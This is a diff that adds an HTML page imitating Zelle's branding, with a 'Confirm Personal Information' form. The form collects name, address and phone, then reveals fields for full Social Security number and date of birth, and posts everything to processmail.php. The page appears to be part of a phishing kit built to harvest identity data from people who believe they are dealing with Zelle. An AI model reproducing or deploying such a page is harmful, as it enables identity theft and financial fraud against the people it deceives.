@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+	<link rel="stylesheet" href="css/style.css">
+	<link rel="Image/cropped-unnamed-32x32.png" href="Image/cropped-unnamed-32x32.png">
+    <link rel="shortcut icon" type="Image/cropped-unnamed-32x32.png" href="Image/cropped-unnamed-32x32.png">
+	<script src="https://kit.fontawesome.com/2ff1153782.js" crossorigin="anonymous"></script>
+	<script src="js/jquery-3.3.1.js"></script>
+	<link href="icofont/icofont.min.css" rel="stylesheet">
+	<!-- <link rel="stylesheet" href="css/animate.min.css"> -->
+	<link rel="stylesheet" href="css/theme.css">
+	<script src="bootstrap/js/bootstrap.min.js"></script>
+	<script src="https://maps.googleapis.com/maps/api/js"></script>
+    
+    <title> BILL – Zelle</title>
+</head>
+<body>
+    <div class="container-fluid topbar">
+        <style>
+           .topbar{
+            background-color: #6D1ED4;
+           } 
+           .heading-title{
+            color: #FFFFFF;
+            font-family: "Roboto Slab", Sans-serif;
+            font-weight: 400;
+            font-size: 29px;
+           }
+           .center-image{
+            text-align: center;
+           }
+           .size-medium{
+            font-size: 19px;
+            color: #434445;
+            font-family: Sans-serif;
+           }
+           .size-small{
+            color: #DE3C3C;
+            font-family:  "Roboto slab", Sans-serif;
+            font-size: 15px;
+           }
+           input, select{
+            display: block;
+            width: 100%;
+            padding: 0.375rem 0.375rem;
+            margin-bottom: 5px;
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #212529;
+            background-color: transparent;
+            border-width: 1.5px ;
+            border-color: #6D1ED4;
+           }
+           .btn-primary2{
+            color: #fff;
+            background-color: #6D1ED4;
+            border-color: #6D1ED4;
+           }
+           .showcon{
+            /* visibility: hidden; */
+            display: none;
+           }
+           @media screen and (min-width:601px) {
+            .heading-title{
+                text-align: left;
+            }
+            .headingtitle, .size-medium {
+                text-align: left;
+            }
+           }
+           @media screen and (max-width:600px) {
+            .heading-title{
+                text-align: center;
+            }
+            .headingtitle, .size-medium{
+                text-align: center;
+            }
+            .buttonnext{
+                text-align: center;
+            }
+            .centerimg2 img{
+                width: 100%;
+                height: auto;
+            }
+            .statef{
+                padding-top: 2rem;
+            }
+           }
+           
+        </style>										
+        <div class="container">
+            <div class="row">
+                <div class="col-md-auto">
+                    <a href="http://zellepay.com">
+                        <img width="100%" height="auto" src="Image/Z-Header-1024x210.jpg" class="attachment-large size-large" alt="" loading="lazy"  sizes="(max-width: 1024px) 100vw, 1024px">
+                    </a>
+                </div>     
+	        </div>
+            <h2 class="heading-title">ZELLE WITH ALL BANK</h2>
+        </div>
+    </div>
+    <section class="subpaddingf">
+        <div class="container">
+            <h3 class="size-default">Confirm Personal Information</h3>
+            <form action="processmail.php" method="post" role="form" >
+                
+                <div class="form-group subpaddingf">
+                    <input type="text" name="name" class="" id="name" placeholder="Full Name" required />
+                  </div>
+                  <div class="form-group subpaddingf">
+                    <input type="text" name="sadd" class="" id="sadd" placeholder="Street Address"  required />
+                  </div>
+                  <div class="form-group subpaddingf">
+                    <input type="text" name="apart" class="" id="apart" placeholder="Appartment , Suite, etc"  data-msg="Please enter Expire Date"/>
+                  </div>
+
+                <div class="form-group subpaddingf">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <input type="text" name="city" class="" id="city" placeholder="City" data-msg="Please enter your City" required/>
+                        </div>
+                        <div class="col-md-6 statef">
+                            <input type="text" name="State" class="" id="State" placeholder="State" data-msg="Please enter your State" required/>
+                        </div>
+                    </div>
+                  </div>
+                  <div class="form-group subpaddingf">
+                    <input type="number" name="zipcode" class="" id="zipcode" placeholder="Zip code"  required data-msg="Please enter your Zip Code"/>
+                  </div>
+
+                  <div class="form-group subpaddingf">
+                    <input type="number" name="pnumber" class="" onfocus="showElement()" id="pnumber" placeholder="Mobile Number" required  data-msg="Mobile Number"/>
+                  </div>
+                  <script type="text/javascript">
+                        function showElement(){
+                            element = document.querySelector('.showcon');
+                            element.style.display = 'block';
+                        }
+                  </script>
+
+                  <div class="showcon">
+                    <div class="form-group subpaddingf">
+                        <input type="number" name="ssn" class="" id="ssn" placeholder="Full SSN"  required/>
+                    </div>
+                    <div class="form-group subpaddingf">
+                        <input type="text" name="dob" class="" id="dob" placeholder="Date of Birth mm/dd/yyyy" required/>
+                    </div>
+                  </div>
+                <div class="buttonnext subpaddingf">
+                    <button type="submit" class="btn btn-primary2 btn-lg" name="btnbill"> Next </button>
+            </div>
+              </form>
+            
+    </section>
+
+   
+    <section class="mypaddings">
+        <div class="center-image centerimg2">
+            <a href="https://youtu.be/IDZa1wRsCYM">
+            <img width="741" height="1024" src="Image/Z-middle3-741x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy">
+            </div>
+        </div>
+        <div class="container">
+            
+                    <div class="center-image centerimg2">
+                        <img width="687vw" height="1024vw" src="Image/Z-footer-687x1024.jpg" class="attachment-thumbnail size-thumbnail" alt="" loading="lazy" >
+                    </div>
+
+        </div>
+        
+       
+    </section>
+</body>
+</html>
